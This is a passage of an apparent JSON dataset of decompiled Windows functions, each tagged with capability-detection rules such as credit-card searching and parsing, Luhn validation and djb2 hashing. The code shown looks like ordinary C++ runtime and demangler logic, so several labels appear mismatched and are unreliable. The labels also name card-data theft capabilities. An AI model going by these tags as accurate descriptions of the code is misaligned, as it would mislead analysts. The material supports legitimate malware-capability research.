0x2c)) {\n            *(arg1 + 0x28) = iVar1 + 1;\n            puVar4 = iVar1 * 0x20 + *(arg1 + 0x20);\n            *(puVar4 + 1) = 0;\n            *puVar4 = 0;\n            *(puVar4 + 4) = \"(anonymous namespace)\";\n            puVar4[6] = 0x15;\n            goto code_r0x000140005128;\n        }\n    }\n    puVar4 = NULL;\ncode_r0x000140005128:\n    *(arg1 + 0x40) = puVar4;\n    return puVar4;\n}\n",
        "token_count": 535
    },
    "140017bb": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nint32_t fcn.140017bb0(int64_t arg1, int64_t arg2)\n\n{\n    int32_t iStack48;\n    int32_t aiStack44 [3];\n    \n    fcn.140017880(arg1, &iStack48);\n    fcn.140017880(arg2, aiStack44);\n    return (((*(arg1 + 0x14) - *(arg2 + 0x14)) * 0x20 + iStack48) - aiStack44[0]) * 0x100000;\n}\n",
        "token_count": 119
    },
    "1400067a": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nint32_t * fcn.1400067a0(int64_t arg1)\n\n{\n    ulong *puVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    ulong arg4;\n    char cVar4;\n    int64_t arg1_00;\n    char *pcVar5;\n    char *pcVar6;\n    uint64_t arg3;\n    uint64_t uVar7;\n    \n    pcVar6 = *(arg1 + 0x18);\n    if (*pcVar6 != 'L') {\n        return NULL;\n    }\n    pcVar5 = pcVar6 + 1;\n    *(arg1 + 0x18) = pcVar5;\n    if (pcVar6[1] == '_') {\n        pcVar5 = pcVar6 + 2;\n        piVar3 = NULL;\n        *(arg1 + 0x18) = pcVar5;\n        cVar4 = pcVar6[2];\n        if (cVar4 != 'Z') goto code_r0x000140006879;\n    }\n    else if (pcVar6[1] != 'Z') {\n        piVar3 = fcn.140005410(arg1);\n        if (piVar3 == NULL) {\n            return NULL;\n        }\n        pcVar5 = *(arg1 + 0x18);\n        pcVar6 = pcVar5;\n        if (*piVar3 == 0x27) {\n            puVar1 = *(piVar3 + 4);\n            if (*(puVar1 + 0x1c) != 0) {\n                *(arg1 + 0x48) = *(arg1 + 0x48) - *(puVar1 + 1);\n            }\n            iVar2 = sub.msvcrt.dll_strcmp(*puVar1, \"decltype(nullptr)\");\n            cVar4 = *pcVar5;\n            if (iVar2 != 0) goto code_r0x0001400067ed;\n            if (cVar4 == 'E') {\n                *(arg1 + 0x18) = pcVar5 + 1;\n                return piVar3;\n            }\n            uVar7 = 0x3d;\n            if (cVar4 == 'n') goto code_r0x0001400068e0;\ncode_r0x000140006827:\n            do {\n                pcVar5 = pcVar5 + 1;\n                if (cVar4 == '\\0') {\n                    return NULL;\n                }\n                *(arg1 + 0x18) = pcVar5;\n                cVar4 = *pcVar5;\n            } while (cVar4 != 'E');\n            arg3 = pcVar5 - pcVar6;\n        }\n        else {\n            cVar4 = *pcVar5;\ncode_r0x0001400067ed:\n            uVar7 = 0x3d;\n            if (cVar4 == 'n') {\ncode_r0x0001400068e0:\n                pcVar6 = pcVar5 + 1;\n                uVar7 = 0x3e;\n                *(arg1 + 0x18) = pcVar6;\n                cVar4 = pcVar5[1];\n            }\n            pcVar5 = pcVar6;\n            if (cVar4 != 'E') goto code_r0x000140006827;\n            arg3 = 0;\n        }\n        arg1_00 = arg1;\n        arg4 = fcn.140004840(arg1, pcVar6, arg3);\n        piVar3 = fcn.140004740(arg1_00, uVar7 & 0xffffffff, piVar3, arg4);\n        pcVar5 = *(arg1 + 0x18);\n        cVar4 = *pcVar5;\n        goto code_r0x000140006879;\n    }\n    *(arg1 + 0x18) = pcVar5 + 1;\n    if ((pcVar5[1] == 'G') || (pcVar5[1] == 'T')) {\n        piVar3 = fcn.140007780(arg1);\n        pcVar5 = *(arg1 + 0x18);\n        cVar4 = *pcVar5;\n    }\n    else {\n        piVar3 = fcn.1400081f0(arg1, 0);\n        pcVar5 = *(arg1 + 0x18);\n        cVar4 = *pcVar5;\n    }\ncode_r0x000140006879:\n    if (cVar4 != 'E') {\n        return NULL;\n    }\n    *(arg1 + 0x18) = pcVar5 + 1;\n    return piVar3;\n}\n",
        "token_count": 1009
    },
    "140004a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nulong fcn.140004a40(int64_t arg1)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    \n    pcVar1 = *(arg1 + 0x18);\n    if (*pcVar1 == '_') {\n        *(arg1 + 0x18) = pcVar1 + 1;\n        if (pcVar1[1] == '_') {\n            *(arg1 + 0x18) = pcVar1 + 2;\n            iVar2 = fcn.1400048a0(arg1);\n            if (iVar2 < 0) {\n                return 0;\n            }\n            if (9 < iVar2) {\n                if (**(arg1 + 0x18) != '_') {\n                    return 0;\n                }\n                *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            }\n        }\n        else {\n            iVar2 = fcn.1400048a0(arg1);\n            if (iVar2 < 0) {\n                return 0;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 241
    },
    "14001ae1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint64_t fcn.14001ae10(ulong arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    bool bVar1;\n    uint64_t uVar2;\n    uchar *puVar3;\n    uchar auStack49 [9];\n    \n    puVar3 = auStack49 + 1;\n    do {\n        puVar3 = puVar3 + -1;\n        *puVar3 = *(arg3 % 10 + 0x1400fe8b0);\n        bVar1 = 9 < arg3;\n        arg3 = arg3 / 10;\n    } while (bVar1);\n    uVar2 = (auStack49 + 1) - puVar3;\n    if (arg2 < uVar2) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(arg1, auStack49 + (1 - uVar2), uVar2);\n        uVar2 = uVar2 & 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 228
    },
    "14001cec": {
        "rules": [
            "search for credit card data/546f8dc683b8415fa126b38355d21de5",
            "parse credit card information/2fba96855ce44cd2afbbefaf4df20b4d"
        ],
        "decompiled_code": "\nvoid fcn.14001cec0(uint32_t *arg1, ulong arg2, ulong arg3)\n\n{\n    if (arg3 < 0x218) {\n        if ((-1 < arg3) && (arg3 < 0x218)) {\n    // switch table (536 cases) at 0x140101400\n            switch(*(arg3 * 4 + 0x140101400) + 0x140101400) {\n            case 0x14001d31a:\n                *arg1 = 1;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d32c:\n                *arg1 = 0x14;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d33e:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d350:\n                *arg1 = 0;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d362:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d374:\n                *arg1 = 0x73;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d386:\n                *arg1 = 0x20;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d398:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d3aa:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d3bc:\n                *arg1 = 8;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d3ce:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d3e0:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d3f2:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d404:\n                *arg1 = 0x26;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d416:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d428:\n                *arg1 = 8;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d43a:\n                *arg1 = 8;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d44c:\n                *arg1 = 8;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d45e:\n                *arg1 = 8;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d470:\n                *arg1 = 0x11;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d482:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d494:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d4a6:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d4b8:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d4ca:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d4dc:\n                *arg1 = 0x29;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d4ee:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d500:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d512:\n                *arg1 = 3;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d524:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d536:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d548:\n                *arg1 = 0x28;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d55a:\n                *arg1 = 0x17;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d56c:\n                *arg1 = 0x1c;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d57e:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d590:\n                *arg1 = 0x20;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d5a2:\n                *arg1 = 4;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d5b4:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d5c6:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d5d8:\n                *arg1 = 1;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d5ea:\n                *arg1 = 0x11;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d5fc:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d60e:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d620:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d632:\n                *arg1 = 0x28;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d644:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d656:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d668:\n                *arg1 = 0x28;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d67a:\n                *arg1 = 0x1c;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d68c:\n                *arg1 = 0x27;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d69e:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d6b0:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d6c2:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d6d4:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d6e6:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d6f8:\n                *arg1 = 0x13;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d70a:\n                *arg1 = 0x1e;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d71c:\n                *arg1 = 0x12;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d72e:\n                *arg1 = 0x13;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d740:\n                *arg1 = 0xc;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d752:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d764:\n                *arg1 = 0xc;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d776:\n                *arg1 = 9;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d788:\n                *arg1 = 0xd;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d79a:\n                *arg1 = 0x18;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d7ac:\n                *arg1 = 2;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d7be:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d7d0:\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            }\n        }\n    }\n    else if (arg3 < 0x4ca) {\n        if (arg3 < 0x44c) {\n            if (arg3 < 0x3f1) {\n                if ((0x3e3 < arg3) && (arg3 - 0x3e4 < 0xd)) {\n    // switch table (13 cases) at 0x140101c60\n                    switch(*((arg3 - 0x3e4) * 4 + 0x140101c60) + 0x140101c60) {\n                    case 0x14001d0b0:\n                        *arg1 = 0x16;\n                        *(arg1 + 2) = 0x1400fa280;\n                        return;\n                    case 0x14001d0c8:\n                        *arg1 = 6;\n                        *(arg1 + 2) = 0x1400fa280;\n                        return;\n                    case 0x14001d0e0:\n                        *arg1 = 0xe;\n                        *(arg1 + 2) = 0x1400fa280;\n                        return;\n                    case 0x14001d0f8:\n                        *arg1 = 0xb;\n                        *(arg1 + 2) = 0x1400fa280;\n                        return;\n                    case 0x14001d110:\n                        *arg1 = 0xb;\n                        *(arg1 + 2) = 0x1400fa280;\n                        return;\n                    }\n                }\n            }\n            else {\n                if (arg3 == 0x41d) {\n                    *arg1 = 0x10;\n                    *(arg1 + 2) = 0x1400fa280;\n                    return;\n                }\n                if (arg3 == 0x42b) {\n                    *arg1 = 0xe;\n                    *(arg1 + 2) = 0x1400fa280;\n                    return;\n                }\n            }\n        }\n        else if (arg3 - 0x44c < 0x7e) {\n    // switch table (126 cases) at 0x140101da8\n            switch(*((arg3 - 0x44c) * 4 + 0x140101da8) + 0x140101da8) {\n            case 0x14001d1fa:\n                *arg1 = 0x6b;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d20c:\n                *arg1 = 4;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d21e:\n                *arg1 = 0x13;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d230:\n                *arg1 = 0x1c;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d242:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d254:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d266:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d278:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d28a:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d29c:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d2ae:\n                *arg1 = 0x1f;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d2c0:\n                *arg1 = 0x24;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d2d2:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d2e4:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d2f6:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d308:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            }\n        }\n    }\n    else if (arg3 < 0x5b5) {\n        if (arg3 < 0x570) {\n            if (arg3 == 0x522) {\n                *arg1 = 1;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            }\n            if (arg3 == 0x534) {\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            }\n        }\n        else if (arg3 - 0x570 < 0x45) {\n    // switch table (69 cases) at 0x140101c94\n            switch(*((arg3 - 0x570) * 4 + 0x140101c94) + 0x140101c94) {\n            case 0x14001d128:\n                *arg1 = 0x11;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d140:\n                *arg1 = 0x1b;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d158:\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d170:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d188:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d1a0:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d1b8:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d1d0:\n                *arg1 = 0x10;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            case 0x14001d1e8:\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            }\n        }\n    }\n    else {\n        if (arg3 == 0x962) {\n            *arg1 = 0xb;\n            *(arg1 + 2) = 0x1400fa280;\n            return;\n        }\n        if (arg3 < 0x963) {\n            if (arg3 == 0x89a) {\n                *arg1 = 0x16;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            }\n            if (arg3 == 0x961) {\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            }\n            if (arg3 == 0x718) {\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            }\n        }\n        else {\n            if (arg3 == 0x964) {\n                *arg1 = 0xb;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            }\n            if (arg3 == 0x2095) {\n                *arg1 = 5;\n                *(arg1 + 2) = 0x1400fa280;\n                return;\n            }\n        }\n    }\n    *arg1 = arg3;\n    *(arg1 + 2) = arg2;\n    return;\n}\n",
        "token_count": 4827
    },
    "14001aeb": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\nuint64_t fcn.14001aeb0(char *arg1, int64_t noname_1, char *arg3, char **arg4)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    char *arg1_00;\n    char *arg2;\n    \n    cVar2 = *arg3;\n    pcVar1 = arg1 + noname_1 + -1;\n    arg1_00 = arg1;\n    if (cVar2 == '\\0') {\ncode_r0x00014001afc0:\n        uVar4 = 0;\ncode_r0x00014001af64:\n        *arg1_00 = '\\0';\n        return uVar4;\n    }\n    if (arg1 < pcVar1) {\n        do {\n            if (cVar2 != '%') goto code_r0x00014001aee0;\n            cVar2 = arg3[1];\n            if (cVar2 == 's') {\n                pcVar5 = *arg4;\n                arg4 = arg4 + 1;\n                cVar2 = *pcVar5;\n                if (cVar2 != '\\0') {\n                    arg2 = arg1_00;\n                    if (pcVar1 <= arg1_00) {\ncode_r0x00014001afb5:\n                        fcn.14001bbb0(arg1, arg2);\n                        goto code_r0x00014001afc0;\n                    }\n                    while( true ) {\n                        pcVar5 = pcVar5 + 1;\n                        *arg1_00 = cVar2;\n                        arg1_00 = arg1_00 + 1;\n                        cVar2 = *pcVar5;\n                        if (cVar2 == '\\0') break;\n                        arg2 = pcVar1;\n                        if (pcVar1 == arg1_00) goto code_r0x00014001afb5;\n                    }\n                }\n                arg3 = arg3 + 2;\ncode_r0x00014001aeed:\n                cVar2 = *arg3;\n            }\n            else {\n                if (cVar2 != 'z') {\n                    if (cVar2 != '%') goto code_r0x00014001aee0;\n                    arg3 = arg3 + 1;\ncode_r0x00014001aee3:\n                    *arg1_00 = cVar2;\n                    arg3 = arg3 + 1;\n                    arg1_00 = arg1_00 + 1;\n                    goto code_r0x00014001aeed;\n                }\n                if (arg3[2] != 'u') {\ncode_r0x00014001aee0:\n                    cVar2 = *arg3;\n                    goto code_r0x00014001aee3;\n                }\n                pcVar5 = *arg4;\n                arg4 = arg4 + 1;\n                iVar3 = fcn.14001ae10(arg1_00, pcVar1 - arg1_00, pcVar5);\n                if (iVar3 < 1) break;\n                arg3 = arg3 + 3;\n                arg1_00 = arg1_00 + iVar3;\n                cVar2 = *arg3;\n            }\n            if (cVar2 == '\\0') {\n                uVar4 = arg1_00 - arg1;\n                goto code_r0x00014001af64;\n            }\n        } while (arg1_00 < pcVar1);\n    }\n    fcn.14001bbb0(arg1, arg1_00);\n    return *(arg1 + 0x40);\n}\n",
        "token_count": 792
    },
    "14002e20": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7",
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.14002e200(uint *arg1, ulong arg2, int64_t **noname_2, int64_t **arg4)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    char cVar3;\n    uint8_t uVar4;\n    bool bVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int64_t arg_88h;\n    int64_t *arg1_00;\n    uint64_t noname_10;\n    uint8_t *puVar9;\n    bool bVar10;\n    uint64_t uVar11;\n    int32_t iVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    int64_t *piVar15;\n    uint8_t *puVar16;\n    bool bVar17;\n    bool bVar18;\n    int64_t *piVar19;\n    bool bVar20;\n    char cVar21;\n    uint8_t uVar22;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    int64_t in_stack_00000040;\n    uint32_t *in_stack_00000048;\n    uint32_t *in_stack_fffffffffffffe00;\n    uint32_t *noname_8;\n    uint32_t uVar23;\n    int64_t **in_stack_fffffffffffffe18;\n    int64_t **ppiVar24;\n    code *arg_78h;\n    int64_t *piVar25;\n    int64_t *arg_80h;\n    uint *in_stack_fffffffffffffe38;\n    uint *arg3;\n    int64_t *piStack440;\n    int64_t *piStack432;\n    uint uStack424;\n    uint uStack420;\n    uint32_t uStack416;\n    uint uStack412;\n    int64_t *piStack408;\n    uint32_t uStack400;\n    ulong uStack392;\n    uint32_t uStack384;\n    uint uStack380;\n    uint32_t uStack368;\n    uint32_t uStack364;\n    char *pcStack360;\n    char *pcStack352;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    \n    piVar15 = arg4[1];\n    uStack392 = *noname_2;\n    uStack384 = *(noname_2 + 1);\n    uStack380 = *(noname_2 + 0xc);\n    piVar19 = *arg4;\n    piVar25 = piVar15;\n    arg_88h = fcn.1400b35e0(in_stack_00000028 + 0xd0);\n    arg1_00 = fcn.1400b36a0(in_stack_00000028 + 0xd0);\n    noname_10 = sub.msvcrt.dll_strlen();\n    uVar11 = uStack384;\n    iVar12 = piVar15;\n    uVar13 = 0;\n    uStack368 = 0;\n    uVar23 = 0;\n    arg_78h = 0x140025c30;\n    piVar15 = uStack392;\n    while( true ) {\n        bVar20 = uVar11 == -1;\n        bVar17 = piVar15 != NULL && bVar20;\n        ppiVar24 = in_stack_fffffffffffffe18;\n        arg_80h = piVar25;\n        bVar10 = bVar20;\n        if (bVar17) {\n            if ((piVar15[2] < piVar15[3]) || (iVar6 = (**(*piVar15 + 0x48))(),  iVar6 != -1)) {\n                ppiVar24 = in_stack_fffffffffffffe18;\n                arg_80h = piVar25;\n                bVar10 = false;\n            }\n            else {\n                uStack392 = NULL;\n                ppiVar24 = in_stack_fffffffffffffe18;\n                arg_80h = piVar25;\n                bVar10 = bVar17;\n            }\n        }\n        bVar17 = iVar12 == -1;\n        if ((piVar19 == NULL) || (!bVar17)) {\n            bVar10 = bVar10 ^ bVar17;\n        }\n        else if ((piVar19[3] <= piVar19[2]) && (iVar6 = (**(*piVar19 + 0x48))(),  iVar6 == -1)) {\n            bVar10 = bVar10 ^ 1;\n            piVar19 = NULL;\n        }\n        if ((noname_10 <= uVar13) || (!bVar10)) break;\n        if (uVar23 != 0) goto code_r0x00014002e675;\n        in_stack_fffffffffffffe18 = in_stack_00000040 + uVar13;\n        uVar4 = *in_stack_fffffffffffffe18;\n        uVar22 = *(arg1_00 + uVar4 + 0x139);\n        if (uVar22 == 0) {\n            uVar22 = uVar4;\n            if (*(*arg1_00 + 0x40) != arg_78h) {\n                uVar22 = (**(*arg1_00 + 0x40))();\n                ppiVar24 = in_stack_fffffffffffffe18;\n            }\n            if (uVar22 != 0) {\n                *(arg1_00 + uVar4 + 0x139) = uVar22;\n                goto code_r0x00014002e390;\n            }\ncode_r0x00014002e398:\n            piVar15 = uStack392;\n            uVar14 = uVar13;\n            if ((*(arg1_00[6] + *in_stack_fffffffffffffe18 * 2) & 0x20) != 0) {\n                do {\n                    uVar22 = uVar11 == -1;\n                    uVar4 = piVar15 != NULL && uVar22;\n                    in_stack_fffffffffffffe18 = ppiVar24;\n                    if (uVar4) {\n                        if (piVar15[3] <= piVar15[2]) {\n                            ppiVar24 = ppiVar24 & 0xffffffffffffff00 | uVar4;\n                            iVar6 = (**(*piVar15 + 0x48))();\n                            uVar4 = ppiVar24;\n                            if (iVar6 == -1) {\n                                piVar15 = NULL;\n                                uStack392 = NULL;\n                                in_stack_fffffffffffffe18 = ppiVar24;\n                                uVar22 = uVar4;\n                                uVar4 = 0;\n                                goto joined_r0x00014002e47b;\n                            }\n                        }\n                        in_stack_fffffffffffffe18 = ppiVar24;\n                        uVar22 = 0;\n                    }\njoined_r0x00014002e47b:\n                    bVar10 = bVar17;\n                    if (piVar19 != NULL && bVar17) {\n                        bVar10 = piVar19 != NULL;\n                        if (piVar19[2] < piVar19[3]) {\n                            bVar10 = false;\n                        }\n                        else {\n                            in_stack_fffffffffffffe18 = in_stack_fffffffffffffe18 & 0xffffffffffffff00 | uVar4;\n                            iVar6 = (**(*piVar19 + 0x48))();\n                            uVar4 = in_stack_fffffffffffffe18;\n                            if (iVar6 == -1) {\n                                piVar19 = NULL;\n                            }\n                            bVar10 = iVar6 == -1 && (bVar10 && bVar17);\n                        }\n                    }\n                    piVar25 = arg_80h;\n                    if (bVar10 == uVar22) goto code_r0x00014002e457;\n                    uVar13 = uVar11;\n                    if (uVar4 == 0) {\ncode_r0x00014002e492:\n                        piVar25 = arg_80h;\n                        if ((*(arg1_00[6] + (uVar13 & 0xff) * 2) & 0x20) == 0) goto code_r0x00014002e457;\n                        puVar9 = piVar15[2];\n                        if (puVar9 < piVar15[3]) goto code_r0x00014002e4ad;\n                        (**(*piVar15 + 0x50))();\n                    }\n                    else {\n                        puVar9 = piVar15[2];\n                        if (piVar15[3] <= puVar9) {\n                            uVar13 = (**(*piVar15 + 0x48))();\n                            if (uVar13 == -1) {\n                                uStack392 = NULL;\n                                piVar15 = NULL;\n                            }\n                            goto code_r0x00014002e492;\n                        }\n                        if ((*(arg1_00[6] + *puVar9 * 2) & 0x20) == 0) goto code_r0x00014002e457;\ncode_r0x00014002e4ad:\n                        piVar15[2] = puVar9 + 1;\n                    }\n                    uStack384 = 0xffffffff;\n                    uVar11 = 0xffffffff;\n                    ppiVar24 = in_stack_fffffffffffffe18;\n                } while( true );\n            }\n            cVar21 = 